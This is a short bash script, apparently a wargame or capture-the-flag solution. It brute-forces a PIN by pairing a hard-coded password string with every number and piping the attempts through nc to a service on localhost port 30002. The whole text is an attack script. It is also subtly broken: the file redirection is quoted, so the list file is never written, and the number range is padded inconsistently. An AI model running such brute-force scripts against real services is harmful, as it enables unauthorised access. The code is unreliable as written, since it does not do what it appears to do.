#!/bin/bash

for i in {000..9999}
do
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> lista2.txt"
done

cat lista2.txt | nc localhost 30002 | grep "The pass"